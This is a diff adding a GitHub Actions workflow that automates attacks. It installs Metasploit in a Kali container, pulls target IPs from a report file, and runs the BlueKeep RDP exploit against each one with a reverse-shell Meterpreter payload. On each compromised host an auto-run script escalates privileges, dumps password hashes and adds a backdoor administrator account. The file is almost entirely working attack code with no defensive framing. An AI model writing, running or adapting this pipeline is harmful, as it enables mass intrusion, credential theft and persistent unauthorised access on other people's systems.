@@ -1,0 +1,65 @@
+name: Advanced Exploitation and Persistence
+
+on:
+  workflow_dispatch:
+
+jobs:
+  execute_attack:
+    runs-on: ubuntu-latest
+    container:
+      image: kalilinux/kali-rolling
+      options: --user root
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Install Frameworks
+        run: |
+          apt-get update
+          apt-get install -y metasploit-framework python3
+          
+      - name: Build Attack Logic
+        run: |
+          python3 - <<EOF
+          import re
+          import os
+
+          report_file = "clean_report.txt"
+          rc_file = "final_attack.rc"
+          
+          if os.path.exists(report_file):
+              with open(report_file, "r") as f:
+                  content = f.read()
+
+              ips = re.findall(r"TARGET IP\s+:\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", content)
+              unique_ips = list(set(ips))
+
+              with open(rc_file, "w") as rc:
+                  rc.write("spool final_report.txt\n")
+                  rc.write("setg LHOST 127.0.0.1\n")
+                  rc.write("setg LPORT 4444\n")
+                  rc.write("setg AutoRunScript multi_console_command -c \"getsystem,hashdump,shell -c 'net user fat 123456 /add && net localgroup administrators fat /add'\"\n")
+                  
+                  for target_ip in unique_ips:
+                      rc.write("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
+                      rc.write(f"set RHOSTS {target_ip}\n")
+                      rc.write("set target 1\n")
+                      rc.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
+                      rc.write("exploit -j -z\n")
+                  
+                  rc.write("sleep 40\n")
+                  rc.write("sessions -l\n")
+                  rc.write("spool off\n")
+                  rc.write("exit\n")
+          EOF
+
+      - name: Launch Exploitation
+        run: |
+          msfconsole -q -r final_attack.rc
+
+      - name: Archive Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: exploitation-log
+          path: final_report.txt
